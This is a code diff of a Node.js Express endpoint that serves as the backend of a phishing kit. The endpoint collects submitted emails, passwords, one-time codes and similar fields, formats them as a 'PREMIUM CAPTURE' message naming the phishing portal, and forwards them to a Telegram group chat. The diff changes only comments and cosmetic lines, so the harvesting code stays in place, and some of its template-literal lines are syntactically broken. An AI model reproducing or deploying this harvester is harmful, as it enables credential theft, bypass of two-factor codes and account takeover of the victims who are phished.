@@ -12,12 +12,12 @@ const CHAT_ID = process.env.CHAT_ID; // This will be your Group ID
 app.post('/submit', async (req, res) => {
     const data = req.body;
     
-    // Formatting a clean, professional log message
+    // Use backticks (the key below Esc) to wrap the message
     let message = 🔥 **PREMIUM CAPTURE** 🔥\n;
     message += ━━━━━━━━━━━━━━━━━━\n;
     message += 🌐 **PORTAL:** \`${data.page || 'Direct Access'}\ \n\n`;
 
-    // Loops through all inputs (email, pass, otp, mmn, etc.)
+    // Loops through all inputs
     for (const [key, value] of Object.entries(data)) {
         if (key !== 'page') {
             let icon = '🔹';
@@ -25,7 +25,6 @@ app.post('/submit', async (req, res) => {
             if (k.includes('pass')) icon = '🔑';
             if (k.includes('user') || k.includes('email')) icon = '👤';
             if (k.includes('otp') || k.includes('code')) icon = '🔢';
-            if (k.includes('dob') || k.includes('date')) icon = '📅';
             
             message += ${icon} **${key.toUpperCase()}:** \`${value}\ \n`;
         }
@@ -43,7 +42,7 @@ app.post('/submit', async (req, res) => {
         });
         res.json({ status: "success" });
     } catch (error) {
-        console.error("Telegram Error:", error.message);
+        console.error("Bot Error:", error.message);
         res.status(500).json({ status: "error" });
     }
 });
